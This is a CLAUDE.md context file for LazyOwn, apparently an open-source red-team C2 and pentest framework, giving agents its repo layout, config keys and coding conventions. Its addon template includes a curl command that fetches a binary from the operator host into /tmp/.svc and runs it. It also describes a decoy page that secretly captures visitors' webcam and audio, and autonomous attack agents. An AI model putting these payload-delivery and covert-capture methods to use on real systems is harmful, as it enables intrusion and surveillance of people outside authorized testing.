# CLAUDE.md — LazyOwn RedTeam Framework

Durable context for any Claude/agent touching this repo. Source of truth: `lazyown.py`, `lazyc2.py`, `utils.py`, `payload.json`, `skills/`, `modules/`, `templates/`.

> **Size budget:** keep this file ≤ 40 KB. Beyond that the prompt cache stops paying off and every assistant invocation pays a tax. `tests/test_claudemd_size.py` enforces the cap; if you need to add a section, trim or move long-form content into a `<dir>/README.md` and link to it from here.

---

## 0. What LazyOwn is

Professional red-team / pentest framework:
- **CLI** (`lazyown.py`): cmd2 shell, ~27k LOC, 333+ commands + 200+ aliases, kill-chain coverage.
- **C2** (`lazyc2.py`): Flask + Jinja2 + Socket.IO, 84+ routes, 55+ templates, malleable HTTP profiles, XOR-stub Go beacon, multi-operator `/collab/`, phishing (SQLite + Groq).
- **Utils** (`utils.py`): ~138 helpers (config, ANSI, NVD/ExploitAlert/PacketStorm scrapers, ARP, certs).
- **Skills** (`skills/`): MCP server (~131 tools), autonomous daemon, hive-mind, MoE+RL SWAN, parquet KB, policy engine, Groq/Ollama agents.

## 0.1 Security contracts

Each security control is a single contract in its own file. Full specs in `docs/SECURITY_CONTRACTS.md`.

| Contract | Module | Tests |
|----------|--------|-------|
| CORS allowlist | `lazyc2/security/cors.py` | `test_cors_policy.py`, `test_cors_behavior.py` |
| CSRF token gate | `lazyc2/security/csrf.py` | `test_csrf_policy.py`, `test_csrf_behavior.py` |
| `/api/run` allowlist | `lazyc2/security/command_allowlist.py` | `test_command_allowlist*.py` |
| HTTPS redirect (PROD) | `lazyc2/security/https_redirect.py` | `test_https_redirect.py` |
| Trusted proxy parser | `lazyc2/security/trusted_proxy.py` | `test_trusted_proxy.py` |
| HTML sanitizer (bleach) | `lazyc2/security/html_sanitizer.py` | `test_html_sanitizer.py` |
| Safe subprocess runner | `core/safe_subprocess.py` | `test_safe_subprocess*.py` |
| AES key resolution | `core/config.py` | `test_aes_key_propagation.py` |
| Secret/AES/file services + validators | `lazyc2/security/{services,validators}.py` | `test_security_lazyc2.py` |

Compat: PROD fail-fast on missing C2 keys, DEV warn-and-default. AES key is `payload.json:aes_key` (64 hex) → `self.aes_key` (bytes) + `self.params['aes_key']` (hex). Lazyaddons use `{{aes_key}}` or `{aes_key}` for substitution.
- **Extensions**: `lazyaddons/*.yaml` (declarative tools), `plugins/*.lua` (lupa), `tools/*.tool` (pwntomate auto-jobs).
- **lazyaddons**: `lazyaddons/*.yaml` — extendthe framework with yamls.

MCP sits on top and exposes `lazyown_*` tools to Claude Code.

---

## 1. Entry points

```sh
./run [--no-banner] [-s] [-p sessions/foo.json] [-c 'cmd']   # cmd2 shell
bash fast_run_as_r00t.sh --no-attach --vpn 1                 # full stack in tmux 'lazyown_sessions'
claude mcp add lazyown python3 /home/grisun0/LazyOwn/skills/lazyown_mcp.py
bash skills/mcp_restart.sh                                   # after editing MCP code
```

- `./run` activates `env/` venv then runs `python3 -W ignore lazyown.py`.
- **Only** `lazyown.py` is launched directly; other Python files are imported / executed via `do_run` / called from MCP / spawned by daemon.
- `fast_run_as_r00t.sh` runs as root: starts C2 on `lhost:c2_port` w/ self-signed TLS, nmap recon, auto-loop. `sleep_start` (default `333`s, see `payload.json`) **must** elapse before first loop fire — never timeout below it.

---

## 2. Repo map

| Path | Role |
|------|------|
| `lazyown.py` | cmd2 shell `LazyOwnShell(cmd2.Cmd)`; ~280 `do_*`. Single CLI source. |
| `lazyc2.py` | Flask + Socket.IO C2, decoy site, phishing bp, dashboard, /pty xterm. |
| `utils.py` | Shared helpers + `Config`, `VulnerabilityScanner`, `MyServer`, `IP2ASN`. |
| `payload.json` | **Only** runtime config. Read by every component. |
| `templates/` | 55+ Jinja2; extend `base.html`. Subdirs: `phishing/`, `landing_pages/`, `emails/`. |
| `static/` | CSS/JS (xterm.js, particles.js), icons, `body_report.json`. |
| `modules/` | 50+ modules: LLM clients, `collab_bp`, `dashboard_bp`, world model, playbook engine. |
| `modules/integrations/` | MISP export, Nuclei, Searchsploit. |
| `modules/backdoor/` `modules/rootkit/` `modules/win_rootkit/` | C/C++/C# implants & rootkits. |
| `skills/` | MCP server + autonomous daemon + hive_mind + swan + policy + parquet_db. |
| `sessions/` | Campaign state — **gitignored**, never delete w/o confirmation. `git add -f` to stage. |
| `parquets/` | Columnar KBs: GTFOBins, LOLBas, MITRE ATT&CK (6 `.parquet`). |
| `plugins/` | Lua plugins (lupa). Each `.lua` + `.yaml` metadata. |
| `lazyaddons/` | 76 YAML tool integrations. Auto-discovered. |
| `tools/` | 69 pwntomate `.tool` files; auto-trigger on nmap services. |
| `external/` `modules_ext/` `vpn/` | **Gitignored**; `git add -f` required. Never commit creds. |
| `lazyscripts/` `playbooks/` `lazyadversaries/` | `.ls` recipes, YAML APT playbooks (7 actors), threat profiles. |
| `cli/` | Shell extensions: wizard, graph advisor, reactive hints, dashboard TUI, palette. Zero imports from `lazyown.py`. |
| `cli/commands/` | cmd2 `CommandSet` subpkg, auto-discovered by `cli/registry.py`. |
| `core/` | Canonical `Config`, crypto, validators, `typing.Protocol` interfaces. No framework imports. |
| `scripts/` | Build/maintenance: `build_command_index.py`, `patch_playbook_atomic_ids.py`. |
| `tests/` | 81 files, ~2050 tests. No mocking of C2 or daemon. |
| `lazyown-docker/` `lazygui/` | Docker + desktop GUI. |
| `docs/` | GH Pages site — auto-generated by `DEPLOY.sh`, don't edit HTML. |
| `lazyc2/` | Security validators (`validate_route_path`, `validate_template_name`, `is_safe_template_path`). |
| `banners/` `source/` | Banner / artwork. |
| `QUICKSTART.md` | Canonical 5-min onboarding. Manual; update when operator flow changes. |

**Every directory has a `README.md`.** Create one immediately when adding a new dir. Rules per §10: English-only, no emojis, file/subdir table, "How it works" + "Adding X" sections, no generated content.

---

## 3. `payload.json` — single config source

Loaded by `core.config.load_payload()`, wrapped by `class Config` (`core/config.py`). Every component reads here. **Nothing hardcoded; nothing duplicated; if reused → goes here.**

Typed shape lives in `core/payload_schema.py` (`SCHEMA`): every well-known key has a `FieldSpec` (kind, default, description, example, sensitive flag, required flag). Use `validate_payload(data)` for non-fatal issue reports, `validate_value(key, value)` for single-field checks and `coerce_value(key, raw)` for safe casts (`"5555"` → `5555` for ports, `"true"` → `True` for bools). Adding a new well-known key means adding the `FieldSpec` here — the wizard, the `assign` command and the readiness report pick it up automatically.

Critical keys:

| Key | Purpose |
|-----|---------|
| `rhost`, `lhost`, `rport`, `lport` | Target/attacker IPs+ports |
| `c2_port`, `c2_user`, `c2_pass` | C2 socket + basic auth |
| `domain`, `subdomain`, `os_id` | Target context (os_id 1=lin/2=win) |
| `start_user`, `start_pass` | Initial creds (auto-injected on discovery) |
| `wordlist`, `usrwordlist`, `dirwordlist`, `dnswordlist`, `iiswordlist` | SecLists paths |
| `c2_maleable_route` | Beacon URI prefix (default `/pleasesubscribe/v1/users/`) |
| `user_agent_*`, `url_trafic_*` | Malleable C2 profile |
| `sleep`, `sleep_start` | Beacon jitter + auto-loop bootstrap delay |
| `api_key` | Groq (used by `report.py`, AI agents) |
| `enable_telegram_c2`/`discord_c2`/`ia`/`deepseek`/`cloudflare`/`run_in_memory`/`c2_implant_debug`/`c2_debug` | Feature flags |
| `llm_backend` | LLM selection: `"auto"` (Groq when API key is set, else Ollama), `"groq"`, or `"ollama"` |
| `llm_model_groq` | Model identifier passed to the Groq API (default `llama-3.3-70b-versatile`) |
| `llm_model_ollama` | Model identifier passed to the Ollama API (default `deepseek-r1:1.5b`) |
| `ollama_host` | Base URL of the Ollama daemon (default `http://localhost:11434`) |
| `llm_daily_budget_usd` | Daily cost cap the LLM budget proxy enforces (default `1.0`) |
| `llm_per_call_token_cap` | Per call input token cap the proxy enforces (default `8000`) |
| `llm_budget_enabled` | When `false` the proxy passes calls through without recording (default `true`) |
| `llm_reset_at_utc` | UTC time the ledger rolls over (default `00:00`) |
| `llm_model_prices` | Per model price table expressed in United States dollars per million tokens |
| `c2_daily_limit`, `c2_hour_limit`, `c2_login_limit` | flask-limiter strings |
| `targets` | Multi-target list (status, ports, tags, notes) |
| `scope` | Authorized engagement scope: list of CIDR/IP/hostname entries (`*.` wildcards). Empty = scope guard dormant |
| `scope_enforcement` | Scope guard posture: `off` (disabled), `warn` (annotate, default), `enforce` (block out-of-scope offensive commands) |
| `rat_key` | XOR key for stub/beacon |
| `device`, `startip`, `endip` | Net discovery range |

**Read/write:**
- CLI in-process: `self.params[key]` (saved back via `do_assign`/`do_set`).
- External: `from utils import Config, load_payload; cfg = Config(load_payload())`.
- MCP: `lazyown_get_config()` / `lazyown_set_config(key, value)`.

Cross-process state → must go through `payload.json`. Don't invent JSON files unless a genuinely different domain (e.g. `sessions/world_model.json`, `tasks.json`, `objectives.jsonl`).

---

## 4. Architecture

```
operator/Claude ──► ./run ─► lazyown.py (cmd2)
                ──► MCP   ─► skills/lazyown_mcp.py (~131 fns) ─► skills/{daemon,hive_mind,swan,policy,parquet_db}
                ──► Web   ─► lazyc2.py (Flask+SocketIO+Jinja2, /pty, DNS)
                                        │
                       all ──► utils.py (Config, run_command, …) ──► payload.json
                                        │
                                  sessions/ · parquets/ · templates/ · modules/ · plugins/ · lazyaddons/ · tools/
```

CLI and C2 both import `utils.py` + read `payload.json`. MCP reuses `LazyOwnShell` — no second CLI implementation.

---

## 5. CLI conventions (`lazyown.py`)

- One class `LazyOwnShell(cmd2.Cmd)`. Subclass `CommandSet` only when meaningfully orthogonal.
- Methods `do_<name>(self, line)`; docstring = `help <name>`.
- Args: `@with_argparser(parser)` for non-trivial; `@with_argument_list` for simple split.
- `@with_category('Recon')` etc. — keep existing names.
- Aliases: `aliases` dict at class level; payload-derived aliases use class-body `f""` (refresh on shell restart).
- `self.params` mirrors `payload.json`. Write back via `do_assign`/`do_set` only.

### Adding a command — happy path
1. Place near related commands in right category.
2. Read inputs from `self.params` — never accept `rhost`/`lhost`/etc. as positional when in payload.
3. Validate with `check_rhost`/`check_lhost`/`check_lport` (utils).
4. Execute via `run_command(cmd_str)` — captures output, strips ANSI, CSV-logs.
5. Artefacts → `sessions/...` with stable filenames.
6. Add **one** natural short alias (or none).
7. MCP exposes every `do_*` via `lazyown_run_command` automatically.
8. If new command has a phase, add to bridge catalog (`modules/c2_profile.py` or wherever `BridgeSelector` reads) so auto-loop sees it.

### Sad paths
- Missing payload key → `check_rhost(...)` returns False → `print_error` + `return` (don't raise).
- External binary missing → guard with `is_binary_present(name)`, `print_warn` w/ install instructions, don't fall back silently.
- Long-running tool → never timeout below documented runtime (e.g. `lazynmap` ≥ 30 min); detach via `subprocess.Popen`, `print_msg` w/ artefact path.
- OS mismatch → read `sessions/os.json` or `payload.json["os_id"]`; refuse Linux-only against Windows (daemon already enforces).
- Sensitive output → never print secrets; write to `sessions/credentials*.txt` / `hash*.txt`.

### Do NOT
- Import `lazyc2` from CLI — CLI must run without Flask.
- Write to `payload.json` outside `do_assign` / `do_set` / `lazyown_set_config` / `auto_populate` / `do_scope` (race condition).
- Hardcode wordlist/port/IP — use `self.params`.
- Introduce new `print_*` style — use `print_msg`/`print_warn`/`print_error`.

### Scope guard
Every interactive command flows through `LazyOwnShell.onecmd_plus_hooks`, which calls `_scope_check` before dispatch. Offensive commands (kill-chain categories 01–09 + Pwntomate + Adversary, see `cli/scope_guard.OFFENSIVE_CATEGORIES`) targeting an out-of-scope `rhost` are warned (`warn`) or blocked (`enforce`). The guard is **fail-open**: dormant while `scope` is empty or `scope_enforcement` is `off`, and any internal error allows the command. Manage it with the `scope` verb. When you add a `do_*` in an offensive category it is auto-classified — no extra wiring.

---

## 6. C2 (`lazyc2.py`)

- `app = Flask(__name__, static_folder='static')` (~line 1610).
- `socketio = SocketIO(app, async_mode='threading', transports=['websocket'])`; namespaces `/listener`, `/pty`, `/terminal`.
- `flask-limiter` from `c2_daily_limit`/`c2_hour_limit`/`c2_login_limit`.
- 84 routes: landing/dashboard, malleable beacon protocol (`/command/<id>`, `<route_maleable><id>`), uploads, short-URL beacons, phishing, terminal/PTY, surface graph, Bloodhound zip, AI bots, JSON dashboard at `/api/dashboard`.
- Blueprints: `phishing_bp`, `dashboard_bp` (`/dashboard`), `collab_bp` (`/collab`).
- **Blueprint config pattern**: `lazyc2.py` sets `app.config["LAZYOWN_CONFIG"] = config` before `register_blueprint`. Blueprint reads via `current_app.config.get("LAZYOWN_CONFIG")` — do NOT pass module globals.
- Auth: HTTP Basic via `requires_auth` (uses `c2_user`/`c2_pass`) + `flask-login` for operator UI.
- DNS server: `dnslib` resolver in daemon thread.
- Watcher: `watchdog.Observer` reading `event_config.json`.

### Adding a route — happy path
1. Decide operator-only (`@requires_auth`) vs beacon-facing (apply both canonical path AND `f'{route_maleable}<...>'` alias).
2. `render_template('foo.html', ctx=...)` — typed context, not raw request data.
3. Validate paths/templates with `validate_route_path` + `validate_template_name` + `is_safe_template_path`. Never bypass. The canonical implementations live in `lazyc2/security/validators.py` (return `(bool, str)` tuples). Module-level shims in `lazyc2.py` wrap them as booleans for legacy callers — new code must consume the tuple form so the error string can be surfaced to the operator.
4. Persist via existing helpers:
   - JSON: `load_routes`/`save_routes`, `load_short_urls`, etc. — atomic (`*.tmp` → `os.rename`, chmod 600).
   - SQLite: `sqlite3.connect(DB_PATH)` inside `with` blocks.
5. Log to `sessions/access.log` via `logger = logging.getLogger(__name__)`.
6. Reuse existing Socket.IO namespaces.
7. New Jinja2 → `templates/`, extend `base.html`, reuse `header.html`/`nav.html`/`footer.html`.

### Sad paths
- Path traversal → always `is_safe_template_path` first; reject paths escaping `templates/`.
- CSRF/auth bypass → beacon routes accept POST without CSRF (implants don't carry tokens), but operator mutations require auth + session cookie.
- Decoy fall-through → non-`127.0.0.1`/`lhost` IPs hit `decoy()` → renders `decoy.html` (fake landing, captures webcam/audio). Never break this — operator routes must check auth AND origin.
- Hardcoded ports → bind to `lport`/`c2_port` only.
- TLS → `cert.pem`/`key.pem` from `gen_cert.sh`; always HTTPS in PROD.
- Phishing routes → register on `phishing_bp` (template_folder `templates/phishing`), not `app`.

### Template rules
- Extend `base.html`, `{% include %}` partials.
- Mark `|safe` only when you produced the HTML.
- Filenames match `validate_template_name`: `^[a-zA-Z0-9_-]+\.html$`.

---

## 7. `utils.py`

Only module both CLI and C2 import. Use existing helpers:

| Need | Use |
|------|-----|
| Read `payload.json` | `load_payload()` → `Config(...)` |
| ANSI output | `print_msg`/`print_warn`/`print_error` |
| Shell + capture | `run_command(cmd)` |
| XOR | `xor_encrypt_decrypt(data, key)` |
| Self-signed TLS | `generate_certificates()` |
| Exploit search | `find_ss`/`find_ea`/`find_ps`/`nvddb`/`exploitalert`/`packetstormsecurity` |
| HTTP req | `generate_http_req(host, port, uri, ...)` |
| Input validation | `check_rhost`/`check_lhost`/`check_lport` |
| Binary present? | `is_binary_present(name)` — `shutil.which` based, no shell |
| Optional heavy dep | `from core.dependencies import optional_import, optional_attr` — bind lazily so a missing package degrades one feature, not the whole framework |
| Tmux bootstrap | `ensure_tmux_session(name)` |
| Emails/users/creds | `generate_emails`/`get_users_dic`/`crack_password` |
| Vulnerability scan + persist | `VulnerabilityScanner().search_cves(service)` → `.persist(service, target, cves)` writes `sessions/vulns_<target>.json` |
| LLM backend | `from modules.llm_factory import get_llm_backend, try_get_llm_backend` — reads `llm_backend`/`llm_model_*`/`ollama_host` from `payload.json` and returns an `AIModel` that also structurally satisfies `core.protocols.LLMBackend` |

New helpers go here only if shared CLI↔C2. Feature-local helpers → `modules/<feature>.py`.

**LLM backends**: do **not** instantiate `GroqModel`/`OllamaModel` directly. Use `from modules.llm_factory import get_llm_backend` (raises) or `try_get_llm_backend` (returns `None` on failure). The factory reads `llm_backend`, `llm_model_groq`, `llm_model_ollama`, and `ollama_host` from `payload.json`, so swapping providers never requires a code change. Callers that pass an explicit `provider` argument should translate the legacy `groq`/`deepseek` identifiers via the `_PROVIDER_ALIAS` mapping declared next to each call site.

---

## 8. MCP — `skills/lazyown_mcp.py`

~131 tools. **Never re-implements** CLI/C2 — imports `LazyOwnShell` or composes shell + REST + file reads.

### Adding a tool — happy path
1. Functionality must exist as `do_*` / utils helper / C2 endpoint first.
2. Name `lazyown_<verb>_<noun>` (e.g. `lazyown_get_config`).
3. Document params via JSONSchema; mark required/optional explicitly.
4. Return structured JSON (objects/lists), not prose.
5. Run `bash skills/mcp_restart.sh` after editing.

### Sad paths
- Name collision → MCP discovers addons (`lazyaddons/*.yaml`), plugins (`plugins/*.lua`), `.tool` files at startup. Prefix unambiguously.
- Long-running → detach + return; add `*_status` poll tool.
- Never cache `payload.json` across calls — operator may have changed it via CLI.

---

## 9. `sessions/` — authoritative campaign state

**Only** durable cross-process location. Never delete without operator confirmation.

| File | Producer | Consumer |
|------|----------|----------|
| `scan_<rhost>.nmap[.xml]` | `do_lazynmap` | autonomous_daemon, pwntomate, FactStore |
| `vulns_<rhost>.nmap` | `do_lazynmap` (vuln scripts) | reactive_engine |
| `<ip>/<port>/<tool>/*.txt` | pwntomate | bridge_suggest, threat_model |
| `logs/command_<tool>output<domain>.txt` | run_command CSV logger | facts_show |
| `LazyOwn_session_report.csv` | every command | timeline_narrator, threat_model |
| `credentials*.txt`, `hash*.txt` | reactive_engine, do_responder | later phases |
| `vulns_<rhost>.json` | `do_vulns` via `utils.VulnerabilityScanner.persist` | `get_target_context`, reactive_engine, report generator |
| `world_model.json` | autonomous_daemon | session_state, recommend_next |
| `tasks.json` | campaign_tasks | sitrep, dashboard |
| `objectives.jsonl` | inject_objective | autonomous_daemon |
| `sessionLazyOwn.json` | shutdown/handoff | sitrep, c2_notes |
| `os.json` | do_ping, beacon ground truth | every selector |
| `events.jsonl`, `autonomous_events.jsonl` | event_engine, daemon | poll_events |
| `campaign_lessons.jsonl` | EpisodeReflectionEngine | next campaign |
| `policy_facts.json` | policy engine | dashboard |
| `captured_images/` | decoy site | operator review |
| `keyword_fallback_index.json` | rag fallback (no ChromaDB) | rag_query |
| `blacksandbeacon` | `blacksandbeacon` addon (`make`) | collab_join delivery |

Before any tool: (1) `ls sessions/`, (2) read existing artefacts. If answer exists, don't re-scan.

---

## 10. Coding standards (enforced by review)

1. **English only.** Identifiers, strings, logs, docstrings. Translate Spanish remnants when you touch them.
2. **No comments.** Self-explanatory names + docstrings. Single-line note OK for non-obvious constraint or CVE ref.
3. **No emojis** in code/logs/docs unless operator asked. Banner ASCII art OK.
4. **Docstrings on every public function/class**:
   ```python
   def foo(bar: str) -> dict:
       """One-line summary.

       Args:
           bar: …
       Returns:
           …
       Raises:
           …
       """
   ```
5. **No magic numbers** — constants in `class Config` (shared) or `UPPER_SNAKE_CASE` module-level.
6. **No hardcoded paths/ports/IPs/wordlists/creds** — `payload.json` if reused, module constant if local.
7. **SOLID**:
   - **S**: one reason to change per class/fn.
   - **O**: extend via new addon/MCP tool/selector — don't edit hot paths.
   - **L**: new selector honours `BaseSelector.suggest()` contract.
   - **I**: small role-specific protocols (recon/exploit/cred/lateral/privesc).
   - **D**: orchestration depends on `LLMBackend`/`MemoryStore`/`Selector` abstractions, not Groq/ChromaDB directly.
8. **Consistency beats novelty** — when two patterns fit, pick the one already used.
9. **No partial implementations** — end-to-end (CLI ↔ payload.json ↔ MCP ↔ `sessions/` artefact) or not merged.
10. **No backwards-compat shims** for unshipped code — just change it.
11. **Every new directory gets a README** (see §2 rules). No exceptions.
12. **Boy-scout law (tech debt).** When a fix / refactor / new feature uncovers tech debt or a vulnerability that can be addressed **without breaking public surface or shipped behaviour**, address it in the same change and call it out in the PR body. Plan with `/graphify` first so the blast radius is understood — never refactor blindly. If the cleanup is unsafe within the change, open a follow-up task; do **not** silently leave the broken window.
13. **Smart consolidation (DRY+SOLID).** When two or more code paths duplicate logic (~10 LOC or one decision tree), consolidate into a single class/function honouring SOLID. Shared values go to `class Config` / `payload.json` if globally reused, module-level `UPPER_SNAKE_CASE` if local. Refactor must keep every existing call site working and ship with tests that pin behaviour **before** the move. No silent simplifications — feature parity is mandatory.
14. **Tests trend to 100%.** Every change ships with tests. If a touched module gains testable code, the change must raise coverage, not lower it. `pytest -q` must stay green. No `skip` / `xfail` without an issue link in the same PR.
15. **Docs follow code.** When a public surface (CLI verb, MCP tool, payload key, blueprint route, addon schema) is added or renamed, update the matching `docs/<topic>.md` and regenerate `COMMANDS.md` / `UTILS.md` via `python3 readmeneitor.py lazyown.py` and `python3 readmeneitor.py utils.py`. Missing or empty docstrings on new public API block merge. Extend `readmeneitor.py` itself when a new source file deserves auto-generated reference docs.

---

## 11. Spec-driven discipline (in commit/PR body, not code)

**Happy path**: trigger? inputs (payload keys/CLI args/MCP params)? success outcome (`sessions/` file / event / return value)? operator-visible signal?

**Sad paths** (≥ 6 considered per change):
- Required payload key missing/empty.
- External binary or wordlist absent.
- Network unreachable / timeout / TLS error.
- Target OS mismatch.
- Output already exists in `sessions/` — must not redo destructive work.
- Concurrent writer (CLI + daemon).
- AV/EDR detected → reactive_engine raises `escalate_evasion`.
- SIGINT → `signal_handler` cleans tmux/sockets.
- Long-running tool exceeds runtime — never auto-kill, log + continue.
- Phishing template/route name fails validation → re-render form w/ flash error, never `500`.

If a sad path has no defensive code, justify explicitly (e.g. "trusted internal call from `do_assign`, validated upstream").

---

## 12. Agent prompt/context engineering

When invoking Claude/Groq/Ollama (`lazyown_llm_ask`, `swan_run`, `hive_spawn`, `groq_agent`):

1. **System prompt** — persona from `sessions/soul.md` (canonical). Include hard stops (PII, customer-of-customer, destructive ops).
2. **Context window** — only what changes next decision:
   - Current phase (`world_model.json`).
   - Last 3 commands+outputs (`LazyOwn_session_report.csv`).
   - Top-3 pivot candidates (`world_model.NetworkGraph.centrality()`).
   - Active objective (`objectives.jsonl`).
   - Relevant captured creds.
3. **Tool catalogue** — filter bridge catalog to current phase + OS, never all 347 commands.
4. **Output contract** — request `{"command": "...", "reasoning": "...", "mitre": "Txxx"}`. Reject prose.
5. **Reward shaping** — Detection Oracle + OutcomeEvaluator score each step → propagated to RL Q-table + MoE weights. New selectors emit reward `∈ [0, 1]`.

`sessions/soul.md` = only persistent persona/policy file. Update via `lazyown_soul(action="write", content=...)`.

---

## 13. Pick the right extension surface

| Goal | Surface |
|------|---------|
| Wrap existing GitHub tool | `lazyaddons/<name>.yaml` |
| One-liner / payload generator | `plugins/<name>.lua` |
| Auto-run on discovered service | `tools/<name>.tool` |
| New CLI command | `do_<name>` in `lazyown.py` |
| New web UI page / beacon endpoint | `lazyc2.py` route + Jinja2 |
| New Flask blueprint | `modules/<name>_bp.py` + register in `lazyc2.py`; config via `app.config["LAZYOWN_CONFIG"]` |
| New MCP tool | `skills/lazyown_mcp.py` |
| New autonomous selector | subclass `BaseSelector` in `skills/autonomous_daemon.py` |
| New AI agent persona | `skills/lazyown_groq_agents.py` registry |
| New LLM backend | implement `AIModel` in `modules/ai_model.py`, register identifier in `modules/llm_factory.SUPPORTED_BACKENDS`, expose via the `_PROVIDER_ALIAS` mapping when callers need the legacy `groq`/`deepseek` identifiers |
| New knowledge base | new parquet + `lazyown_parquet_query` mode |
| New directory | create + `README.md` immediately |

Adding `do_*` for something that works as a YAML addon = smell.

**Blueprint `template_folder` pattern**:
```python
bp = Blueprint("name", __name__, template_folder="../templates")
```
Resolves `render_template("foo.html")` against root `templates/`. Don't duplicate into `modules/templates/`.

---

## 14. Things this framework deliberately does NOT do

- Detection evasion as primary feature (only in authorized engagements).
- Persist secrets in git (`cert.pem`, `key.pem`, `api_key`, `sessions/credentials*`).
- Run on Windows as host (`lazyown.py` exits if `os.name == 'nt'`). Linux/macOS operator targeting Linux/Win victims.
- Mock C2 or daemon in tests — integration tests run against `sessions/` fixtures.

---

## 15. Quick MCP cheatsheet

```
lazyown_session_init() / lazyown_campaign_sitrep()
lazyown_set_config(key="rhost", value="10.10.11.5")
lazyown_phase_guide(phase="recon")
lazyown_run_command("lazynmap")
lazyown_auto_populate(target="10.10.11.5")
lazyown_facts_show(target="10.10.11.5", refresh=True)
lazyown_searchsploit(query="<service> <version>")
lazyown_parquet_query(mode="context", phase="enum", target="...")
lazyown_rag_query(query="…", n=5)
lazyown_reactive_suggest(output="<raw>", command="<verb>", platform="linux")
lazyown_auto_loop(target="...", max_steps=10)
lazyown_autonomous_start(max_steps_per_objective=15)
lazyown_swan_ensemble(task_type="…", task="…", phase="…")
lazyown_hive_spawn(goal="…", n_drones=4, roles=["recon","exploit","cred","lateral"])
lazyown_generate_report(target="...", include_timeline=True)
lazyown_report_update(action="auto_fill")
lazyown_misp_export()
# CLI: collab_join <handle> [--curl]
# CLI: explore [target]                   — coverage tree + trigger-matched addons/tools
```

---

## 15a. Graph-aware navigation

Self-knowledge graph at `graphify-out/graph_lazyown.json`. Built by `/graphify`. Consumed by `cli/graph_advisor.py` (tested in `tests/test_graph_advisor.py`). Live counts live in `lazyown_graph_summary` (MCP) or `graph_search` / `god_nodes` (CLI). Treat as advisory: if `summary()['health']` is `stale` or `empty`, run `/graphify . --update` before relying on neighbours/suggestions.

**CLI**: `graph_search <q> [n]`, `neighbors <node> [depth] [n]`, `god_nodes [N]`, `suggest_next [seeds...] [N]` (no seeds → reads `sessions/LazyOwn_session_report.csv`). Shell `default()` uses advisor for "did you mean…?".

**MCP**: `lazyown_graph_summary`, `lazyown_graph_search`, `lazyown_graph_neighbors`, `lazyown_graph_suggest_next`. All accept `budget_tokens` (default 1500). Missing graph → `{"available": false, "reason": "..."}`.

**Refresh**: `/graphify .` (full) or `/graphify . --update` (incremental). Advisor caches by `(path, mtime)` — picked up on next call, no restart needed.

---

## 15b. Operator UX

### Inline reactive hints — `cli/reactive_hints.py`
`register_postcmd_hook` prints one dim line after each `do_*`:
```
  ↳ do_gobuster · do_enum4linux · do_ffuf
```
- Suggestions from `GraphAdvisor.suggest_next()`.
- `SKIP_COMMANDS` (help/exit/dashboard/set/palette/…) never produce hints.
- Toggle: `enable_inline_hints` in `payload.json` (default `true`).
- Missing graph → no-op. Latency < 1 ms after first load.
- Public surface: `render_inline_hints(advisor, last_command, limit, enabled)`. Output via `rich.console.Console`. Hook returns `data` unchanged (cmd2 passes `PostcommandData` by reference).

### Dashboard TUI — `cli/dashboard_tui.py`
`dashboard` cmd launches Textual app (blocking, **Q** quits). `LazyOwnDashboard(App)` accepts `payload_path` + `sessions_dir`. Widgets: `TargetPanel` → `KillChainPanel` + `ConfigPanel` → `CommandsPanel` → `OpsPanel` → `HintBar`. `_do_refresh()` on mount + every `REFRESH_INTERVAL` (5s) via `set_interval`. Entry: `launch(payload_path, sessions_dir)`. Requires `pip install textual`.

Pure helpers (tested independently): `_read_json`, `_read_recent_commands`, `_count_lines_in_glob`, `_beacon_count`, `_graph_hints`.

---


### Addon YAML pattern
```yaml
os: linux                  # MITRE platform (any|linux|windows|macos|network|containers|saas|iaas)
trigger: [microsoft-ds]    # nmap service names that auto-suggest this addon; [] = manual only
tool:
  install_command: make
  execute_command: git restore . ; git pull ; make && cp <binary> ../../../sessions/<binary>
  lazycommand: curl -sk "http://{lhost}:{lport}/<binary>" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
```
Rules: always `git restore . ; git pull` before `make`; stage to `sessions/<binary>`; use `{lhost}`/`{lport}` placeholders; never hardcode. `os` defaults to `any`, `trigger` to `[]` — fill them so `explore`/`recommend_next`/`suggest_next` can surface the addon against discovered services.

Tests: `tests/test_blacksandbeacon_addon.py` (59 tests — YAML structure, required fields, path safety, template placeholders, no hardcoded IPs/ports).

---

## 15d. Multi-operator collaboration — `collab_bp`

`modules/collab_bp.py` — Flask blueprint, real-time team server. Auto-activates on `lazyc2.py` start.

| Class | Responsibility |
|-------|----------------|
| `EventBus` | In-process SSE pub/sub; per-subscriber `Queue`; replays last 20 on join |
| `LockManager` | Advisory per-target locks w/ TTL; prevents two operators on same host |
| `OperatorRegistry` | Tracks operators; > 90 s no heartbeat → inactive |
| `ColabEvent` | Value object: `type`, `payload`, `operator`, `ts`, `id` |

Module singletons (`_bus`, `_locks`, `_registry`) injected via closure. Broadcast:
```python
from collab_bp import publish_event
publish_event(type="finding", payload={"target": "...", "detail": "..."}, operator="alice")
```

| Endpoint | Method | Description |
|---|---|---|
| `/collab/` | GET | Browser dashboard (`templates/collab.html`) |
| `/collab/stream?operator=<name>` | GET (SSE) | Real-time events; keepalive 15s |
| `/collab/operators` | GET | Active operators |
| `/collab/publish` | POST | Broadcast event (type, payload, operator) |
| `/collab/lock` | POST | Acquire target lock (target, operator, ttl_secs) |
| `/collab/unlock` | POST | Release lock |
| `/collab/locks` | GET | Active locks w/ TTL |
| `/collab/history?n=N` | GET | Last N events (max 500) |

`templates/collab.html`: extends `base.html`. Operator presence, lock UI, SSE feed, chat, copyable join URL. Reads `c2_host`/`join_url` from Flask context — no hardcoded IPs.

**LAZYOWN_CONFIG injection**:
```python
cfg = current_app.config.get("LAZYOWN_CONFIG", {})
lhost = cfg.get("lhost", "localhost") if hasattr(cfg, "get") else getattr(cfg, "lhost", "localhost")
```
The `hasattr` guard handles both `dict` (tests) and `Config` (prod). **Canonical pattern for blueprints needing payload values.** Don't import `config` from `lazyc2.py`.

**`do_collab_join` CLI** (category 10 C&C):
```
collab_join [handle] [--curl]
```
Reads `lhost`/`c2_port` from `self.params`. Prints dashboard URL, SSE URL, REST endpoints. `--curl` adds `curl --insecure -N` snippet.

Tests: `tests/test_collab_and_onboarding.py` (67 — bus/locks/registry, all 8 HTTP endpoints, template content, `QUICKSTART.md`, wizard DIP, CLI cmd).

---

## 15e. Onboarding — `QUICKSTART.md` + `wizard`

